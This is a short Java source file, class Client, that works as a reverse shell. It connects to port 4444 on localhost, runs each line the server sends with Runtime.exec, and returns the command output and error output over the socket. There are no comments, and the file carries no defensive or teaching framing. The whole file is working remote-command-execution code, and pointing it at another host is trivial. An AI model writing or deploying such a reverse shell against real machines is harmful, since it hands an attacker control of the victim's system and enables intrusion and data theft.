package studio.thamessia;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Scanner;

public class Client {
    public static void main(String[] args)  {
        try {
            Socket socket = new Socket();
            InetSocketAddress inetSocketAddress = new InetSocketAddress("localhost", 4444);

            socket.connect(inetSocketAddress);
            PrintStream ps = new PrintStream(socket.getOutputStream());
            Scanner scanner = new Scanner(new InputStreamReader(socket.getInputStream()));

            for (;;) {
                Process runtime = Runtime.getRuntime().exec(scanner.nextLine());

                BufferedReader inputManager = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
                BufferedReader customManager = new BufferedReader(new InputStreamReader(runtime.getErrorStream()));

                String str;
                while ((str = inputManager.readLine()) != null) {
                    ps.println(str);
                    ps.flush();
                }

                while ((str = customManager.readLine()) != null) {
                    ps.println(str);
                    ps.flush();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
